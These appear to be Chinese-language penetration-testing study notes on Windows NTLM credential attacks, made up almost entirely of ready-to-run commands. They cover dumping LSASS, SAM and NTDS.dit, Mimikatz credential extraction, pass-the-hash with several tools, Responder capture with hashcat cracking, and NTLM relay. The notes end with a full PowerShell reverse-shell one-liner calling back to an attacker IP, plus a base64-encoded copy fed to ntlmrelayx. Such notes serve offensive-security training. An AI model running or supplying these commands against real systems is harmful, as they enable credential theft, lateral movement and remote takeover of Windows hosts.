>[!note] 本章重點
>NTLM主要是Windows密碼相關的東西，NTLM的各種攻擊手法幾乎都需要使用到最高權限。
## Attacking LSASS
>[!info]
>本機安全認證子系統服務（Local Security Authority Subsystem Service，縮寫 LSASS），是微軟視窗作業系統的一個內部程式，負責執行Windows系統安全政策。它在使用者登入時電腦單機或伺服器時，驗證使用者身分，管理使用者密碼變更，並產生存取字元。它也會在視窗安全記錄檔中留下應有的記錄。
- 用PS找LSAAS的ID
```
Get-Process lsass
```
- 用rundll32 Dump LSAAS
```
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```
- Pypykatz解析出密碼
```
pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```
## Volume Shadow Copy Service
>透過磁碟輩分手段撈資料，可以產出NTDS.dit

- 建立備份
```
vssadmin CREATE SHADOW /For=C:
```
- 從shadow裡免撈出NTDS.dit
```
C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```
## 用reg.exe撈出Windows密碼
- 撈密碼
```
reg.exe save hklm\sam C:\sam.save 
reg.exe save hklm\system C:\system.save 
reg.exe save hklm\security C:\security.save
```
*  解析帳號密碼
```
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

## 用Mimikatz撈出密碼及hash

- 作業前要先提權
```
privilege::debug
```
#### Mimikatz撈密碼指令
* 撈明碼以及hash
```
sekurlsa::logonpasswords
```
- 撈SAM的NTLM hash
```
lsadump::sam
```
- 提到最高權限
```
token::elevate
```
## PassTheHash
>當拿到NTLM hash其實就可以打進去了，不需要真的拿到密碼

- smbclient
```
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
```
- impacket-psexec
```
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```
- xfreerdp
```
xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```
- evil-winrm
```
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```
- crackmapexec
```
crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```
- impacket-wmiexec
```
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```
*  開啟RDP的Pth功能
```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

## Net-NTLMv2相關
>[!解釋]
>當拿到Low-Level Shell的時候，無法使用minikatz，但是可以透過Net-NTLMv2拿 hash，原理是利用smb存取kali的臨時伺服器來拿到Net-NTLMv2 hash。

>[!解釋]
>Net-NTLM是不可以用Pass The Hash的，但是可以用Ntlm Relay Attack去打其他台相同帳號的主機。
### 暴力破解NTLMv2
1. Kali : 開設responder
```
sudo responder -I tun0
```
2. Target PC : 直接存取smb
```
dir \\kali ip address\test
```
3. Responder收到Net-NTLM v2
![[Pasted image 20250504173028.png]]
4. 用hashcat破解
```
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
```
### Relaying Net-NTLMv2
>[!warning] 重點
>這邊的想定是VM#1裡面有一個帳號，這個帳號在VM#1是一個low-level帳號，並且Net-NTLMv2很複雜破解不了，我們假設這個帳號是VM#2的帳號，我們可以利用ntlmrelay的方式打進去第二台。

>使用impacket-ntlmrelayx，可以直接把respond反彈到其他主機，-t就是要反彈的主機
```
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.203.212 -c "command"
```
#### 流程
1. 利用VM#1的帳號對kali做smb連線
2. 利用impacket-ntlmrelayx對VM#2做ntlm relay attack
#### 實際執行
* powershell reverse shell one-liner
``` powershell=
$client = New-Object System.Net.Sockets.TCPClient('192.168.50.211',5555);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
* 利用encode(UTF-16LE1200) + base64
``` =
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADUAMAAuADIAMQAxACcALAA1ADUANQA1ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAiAC4AIAB7ACAAJABkAGEAdABhACAAfQAgADIAPgAmADEAIgAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA
```
* 架設impacket-ntlmrelay
``` =
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.203.212 -c "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADQANQAuADEANQA1ACcALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAiAC4AIAB7ACAAJABkAGEAdABhACAAfQAgADIAPgAmADEAIgAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA"
```
* 因為powershell是4444port，所以利用nc監聽4444port就可以拿到reverse shell
![[Pasted image 20250504173629.png]]